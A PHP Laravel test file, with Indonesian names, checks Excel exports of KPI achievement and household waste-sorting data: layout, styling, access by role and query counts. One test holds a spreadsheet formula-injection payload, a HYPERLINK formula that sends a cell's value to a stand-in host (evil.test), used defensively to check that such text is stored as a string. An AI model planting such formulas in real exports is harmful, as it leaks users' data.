<?php

namespace Tests\Feature\Mahasiswa;

use App\Exports\CapaiankpiExport;
use App\Exports\Sheets\CapaianKpiPeriodeSheet;
use App\Exports\Sheets\RekapLldiktiSheet;
use App\Models\Desa;
use App\Models\Kpi;
use App\Models\Kpicapaian;
use App\Models\PendataanPemilahanSampah;
use App\Models\Mahasiswa;
use App\Models\Mahasiswa_lokasi;
use App\Models\Pjdesa;
use App\Models\User;
use App\Services\KpiSampahService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Maatwebsite\Excel\Excel as ExcelType;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;
use Tests\TestCase;

class KpicapaianExportPeriodeTest extends TestCase
{
    use RefreshDatabase;

    private function desaUser(User $user): Desa
    {
        $id = Mahasiswa_lokasi::where('id_mahasiswa', $user->mahasiswa->id_mahasiswa)->value('id_desa');

        return Desa::find($id);
    }

    private function log(string $email, string $tanggal, array $attr = []): void
    {
        PendataanPemilahanSampah::factory()->create($attr + [
            'email' => $email, 'tanggal' => $tanggal,
            'nama_kepala_keluarga' => 'Budi', 'alamat_rumah' => 'Jl. Melati 1', 'rt' => '001', 'rw' => '002',
            'memilah' => true, 'organik_kg' => 2, 'anorganik_kg' => 1, 'residu_kg' => 1,
        ]);
    }

    private function capaian(string $email, string $bulan, array $attr = []): Kpicapaian
    {
        return Kpicapaian::factory()->create($attr + [
            'email' => $email, 'bulan' => $bulan, 'id_kpi' => Kpi::factory()->create()->id_kpi,
        ]);
    }

    private function loginKetua(): User
    {
        $user = $this->loginAs('mahasiswa', ['akses' => 'pjdesa']);
        Pjdesa::create(['email' => $user->email, 'id_desa' => $this->desaUser($user)->id_desa]);

        return $user;
    }

    // Ambil instance export yang dikirim controller lewat route
    private function exportDari(string $url, string $class): object
    {
        $asli = Excel::getFacadeRoot();
        Excel::fake();
        Excel::matchByRegex();
        $this->get($url)->assertOk();
        $hasil = null;
        Excel::assertDownloaded('/^capaian_kpi_.+\.xlsx$/', function ($e) use ($class, &$hasil) {
            $hasil = $e;

            return $e instanceof $class;
        });
        Excel::swap($asli);

        return $hasil;
    }

    private function render(object $export): Worksheet
    {
        $path = tempnam(sys_get_temp_dir(), 'capkpi').'.xlsx';
        file_put_contents($path, Excel::raw($export, ExcelType::XLSX));
        $ws = IOFactory::load($path)->getActiveSheet();
        @unlink($path);

        return $ws;
    }

    public function test_ketua_periode_jadi_kolom_tanpa_baris_sekat(): void
    {
        $user = $this->loginKetua();
        $desa = $this->desaUser($user);
        $this->log($user->email, '2026-09-10');
        $this->log($user->email, '2026-08-05', ['memilah' => false, 'organik_kg' => 1, 'anorganik_kg' => 0, 'residu_kg' => 3]);
        $this->capaian($user->email, '2026-09-01', ['permasalahan' => 'Masalah Sept', 'status_capaian' => 'P']);

        $ws = $this->render($this->exportDari('kpicapaian/export', CapaianKpiPeriodeSheet::class));
        $semua = collect($ws->toArray())->flatten()->filter()->all();

        // Tabel sampah: judul(1) header(2) Sept(3) Agu(4) — periode di kolom Bulan, terbaru dulu
        $this->assertSame('Data Sampah', $ws->getCell('A1')->getValue());
        $this->assertSame(RekapLldiktiSheet::HEADER, $ws->rangeToArray('A2:L2')[0]);
        $this->assertSame('September 2026', $ws->getCell('A3')->getValue());
        $this->assertSame($desa->desa, $ws->getCell('C3')->getValue());
        $this->assertSame('Agustus 2026', $ws->getCell('A4')->getValue());
        $this->assertEquals(3.0, $ws->getCell('I4')->getValue()); // residu Agustus

        // Tabel KPI: pemisah(5) judul(6) header(7) data(8); kolom sama dengan UI
        $this->assertNull($ws->getCell('A5')->getValue());
        $this->assertSame('Capaian KPI', $ws->getCell('A6')->getValue());
        $this->assertSame(
            ['No', 'Bulan', 'Lokasi Kegiatan', 'Nama KPI', 'Permasalahan', 'Solusi', 'Kebutuhan Dukungan', 'Tindak Lanjut', 'Tautan'],
            $ws->rangeToArray('A7:I7')[0],
        );
        $this->assertEquals(1, $ws->getCell('A8')->getValue());
        $this->assertSame('September 2026', $ws->getCell('B8')->getValue());
        $this->assertSame('Masalah Sept', $ws->getCell('E8')->getValue());
        $this->assertSame('Proses', $ws->getCell('H8')->getValue());
        $this->assertSame(8, $ws->getHighestRow());

        // Tidak ada baris sekat / "Belum ada ..." per periode
        $this->assertEmpty(preg_grep('/^(Periode:|Belum ada)/', $semua));

        // Angka sampah sama dengan KpiSampahService::rekapLldikti
        $rekap = app(KpiSampahService::class)->rekapLldikti(['id_desa' => $desa->id_desa]);
        $r = $rekap->firstWhere('bulan', '2026-09')->kecamatan->flatMap->desa->first();
        $this->assertEquals($r->jml_rumah, $ws->getCell('D3')->getValue());
        $this->assertEquals($r->organik, $ws->getCell('G3')->getValue());
        $this->assertEquals($r->total_dihasilkan, $ws->getCell('K3')->getValue());
        $this->assertEqualsWithDelta($r->persen_ketaatan / 100, $ws->getCell('F3')->getValue(), 0.0001);

        // Format tabel sampah sama dengan RekapLldiktiSheet
        $this->assertSame('FFFF00', $ws->getStyle('A2')->getFill()->getStartColor()->getRGB());
        $this->assertSame('FFFF00', $ws->getStyle('I7')->getFill()->getStartColor()->getRGB());
        $this->assertSame(45.0, (float) $ws->getRowDimension(2)->getRowHeight());
        $this->assertTrue($ws->getStyle('A2')->getAlignment()->getWrapText());
        $this->assertSame(22.0, (float) $ws->getColumnDimension('C')->getWidth());
        $this->assertSame(16.0, (float) $ws->getColumnDimension('D')->getWidth());
        $this->assertSame('0.00%', $ws->getStyle('L3')->getNumberFormat()->getFormatCode());
        $this->assertSame('#,##0', $ws->getStyle('D3')->getNumberFormat()->getFormatCode());
        $this->assertSame('#,##0.00', $ws->getStyle('G3')->getNumberFormat()->getFormatCode());
        $this->assertSame('thin', $ws->getStyle('L4')->getBorders()->getBottom()->getBorderStyle());
        $this->assertSame('Capaian KPI', $ws->getTitle());
    }

    public function test_tabel_sampah_merge_bulan_dan_kecamatan_seperti_rekap_lldikti(): void
    {
        $rekap = collect([(object) [
            'bulan' => '2026-09', 'nama_bulan' => 'September 2026',
            'kecamatan' => collect([(object) ['id_kecamatan' => 1, 'kecamatan' => 'Coblong', 'desa' => collect([
                (object) ['desa' => 'Dago', 'jml_rumah' => 2, 'jml_rumah_memilah' => 1, 'persen_ketaatan' => 50.0,
                    'organik' => 1, 'anorganik' => 1, 'residu' => 1, 'total_terkelola' => 2, 'total_dihasilkan' => 3, 'persen_penurunan' => 66.67],
                (object) ['desa' => 'Lebak', 'jml_rumah' => 1, 'jml_rumah_memilah' => 1, 'persen_ketaatan' => 100.0,
                    'organik' => 1, 'anorganik' => 0, 'residu' => 0, 'total_terkelola' => 1, 'total_dihasilkan' => 1, 'persen_penurunan' => 100.0],
            ])]]),
        ]]);

        $ws = $this->render(new CapaianKpiPeriodeSheet($rekap, collect()));
        $merge = array_values($ws->getMergeCells());

        // Data Sampah(1) header(2) Dago(3) Lebak(4)
        $this->assertContains('A3:A4', $merge);
        $this->assertContains('B3:B4', $merge);
        $this->assertSame('Lebak', $ws->getCell('C4')->getValue());
    }

    public function test_anggota_melihat_capaian_ketua_dan_sampah_desa_kelompok(): void
    {
        $ketua = Mahasiswa::factory()->create();
        $desa = Desa::factory()->create();
        Pjdesa::create(['email' => $ketua->email, 'id_desa' => $desa->id_desa]);
        $this->capaian($ketua->email, '2026-09-01', ['permasalahan' => 'Masalah Ketua']);
        $pjLuar = Pjdesa::create(['email' => 'luar@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $this->capaian($pjLuar->email, '2026-09-01', ['permasalahan' => 'Masalah Luar']);

        $user = $this->loginAs('mahasiswa');
        Mahasiswa_lokasi::where('id_mahasiswa', $user->mahasiswa->id_mahasiswa)->update(['id_desa' => $desa->id_desa]);
        $this->log($user->email, '2026-09-10');

        $ws = $this->render($this->exportDari('kpicapaian/export', CapaianKpiPeriodeSheet::class));
        $semua = collect($ws->toArray())->flatten()->filter()->all();

        $this->assertContains('Masalah Ketua', $semua);
        $this->assertNotContains('Masalah Luar', $semua);
        $this->assertContains($desa->desa, $semua);
    }

    public function test_mahasiswa_tanpa_desa_tidak_error(): void
    {
        $user = $this->loginAs('mahasiswa');
        Mahasiswa_lokasi::where('id_mahasiswa', $user->mahasiswa->id_mahasiswa)->update(['id_desa' => null]);

        $ws = $this->render($this->exportDari('kpicapaian/export', CapaianKpiPeriodeSheet::class));

        // Kedua tabel kosong: masing-masing 1 baris "Belum ada data"
        $this->assertSame('Belum ada data', $ws->getCell('A3')->getValue());
        $this->assertSame('Belum ada data', $ws->getCell('A7')->getValue());
        $merge = array_values($ws->getMergeCells());
        $this->assertContains('A3:L3', $merge);
        $this->assertContains('A7:I7', $merge);
        $this->assertSame(7, $ws->getHighestRow());
    }

    public function test_ketua_tanpa_log_harian_tabel_sampah_kosong(): void
    {
        $user = $this->loginKetua();
        $this->capaian($user->email, '2026-09-01');

        $ws = $this->render($this->exportDari('kpicapaian/export', CapaianKpiPeriodeSheet::class));

        $this->assertSame('Belum ada data', $ws->getCell('A3')->getValue());
        $this->assertContains('A3:L3', array_values($ws->getMergeCells()));
        $this->assertSame('September 2026', $ws->getCell('B7')->getValue());
    }

    public function test_teks_berawalan_sama_dengan_bukan_formula_di_sheet_mahasiswa(): void
    {
        $user = $this->loginKetua();
        $formula = '=HYPERLINK("https://evil.test/?d="&B2,"Klik")';
        $this->capaian($user->email, '2026-09-01', ['permasalahan' => $formula, 'tautan' => '=1+1']);

        $ws = $this->render($this->exportDari('kpicapaian/export', CapaianKpiPeriodeSheet::class));

        // Data Sampah(1) header(2) kosong(3) pemisah(4) Capaian KPI(5) header(6) data(7)
        $this->assertSame(DataType::TYPE_STRING, $ws->getCell('E7')->getDataType());
        $this->assertSame($formula, $ws->getCell('E7')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $ws->getCell('I7')->getDataType());
    }

    public function test_jumlah_query_export_mahasiswa_tidak_bertambah_per_baris(): void
    {
        $user = $this->loginKetua();
        $hitung = function () use ($user) {
            DB::flushQueryLog();
            DB::enableQueryLog();
            Excel::raw($this->exportDari('kpicapaian/export', CapaianKpiPeriodeSheet::class), ExcelType::XLSX);
            $n = count(DB::getQueryLog());
            DB::disableQueryLog();

            return $n;
        };

        $this->capaian($user->email, '2026-09-01');
        $sedikit = $hitung();
        foreach (range(1, 5) as $i) {
            $this->capaian($user->email, '2026-0'.(4 + $i % 5).'-01');
            $this->log($user->email, '2026-0'.(4 + $i % 5).'-10', ['rt' => '00'.$i]);
        }

        $this->assertSame($sedikit, $hitung());
    }

    public function test_pt_dan_role_lapcapaian_tetap_capaiankpi_export_dengan_styling(): void
    {
        $this->capaian('ketua@pps.test', '2026-09-01');

        $this->loginAs('pt');
        $this->exportDari('kpicapaian/export', CapaiankpiExport::class);

        foreach (['admin', 'dpl', 'pt', 'kepala', 'pemda'] as $role) {
            $this->loginAs($role);
            $this->exportDari('lapcapaiankpi/export', CapaiankpiExport::class);
        }

        $this->loginAs('admin');
        $export = new CapaiankpiExport();
        $ws = $this->render($export);

        // Tanpa kolom No: A–J, kolom K tidak ikut di-style
        $this->assertSame($export->headings(), $ws->rangeToArray('A1:J1')[0]);
        $this->assertNotContains('No', $export->headings());
        $this->assertSame('ketua@pps.test', $ws->getCell('C2')->getValue());
        $this->assertSame('FFFF00', $ws->getStyle('J1')->getFill()->getStartColor()->getRGB());
        $this->assertSame('none', $ws->getStyle('K1')->getFill()->getFillType());
        $this->assertTrue($ws->getStyle('A1')->getFont()->getBold());
        $this->assertSame('A2', $ws->getFreezePane());
        $this->assertSame('thin', $ws->getStyle('J2')->getBorders()->getBottom()->getBorderStyle());
        $this->assertSame('none', $ws->getStyle('K2')->getBorders()->getBottom()->getBorderStyle());
        $this->assertSame(14.0, (float) $ws->getColumnDimension('A')->getWidth());
    }

    public function test_capaiankpi_export_urut_bulan_terbaru(): void
    {
        $this->capaian('lama@pps.test', '2026-07-01');
        $this->capaian('baru@pps.test', '2026-09-01');
        $this->loginAs('admin');

        $rows = (new CapaiankpiExport())->collection();
        $this->assertSame(['baru@pps.test', 'lama@pps.test'], $rows->pluck('PJ Desa')->all());
    }

    public function test_akses_export_ditolak_untuk_guest_dan_role_lain(): void
    {
        $this->get('kpicapaian/export')->assertRedirect(route('login'));
        $this->get('lapcapaiankpi/export')->assertRedirect(route('login'));

        foreach (['dpl', 'admin', 'kepala', 'pemda'] as $role) {
            $this->loginAs($role);
            $this->get('kpicapaian/export')->assertRedirect(route('home'));
        }

        $this->loginAs('mahasiswa');
        $this->get('lapcapaiankpi/export')->assertRedirect(route('home'));
    }
}
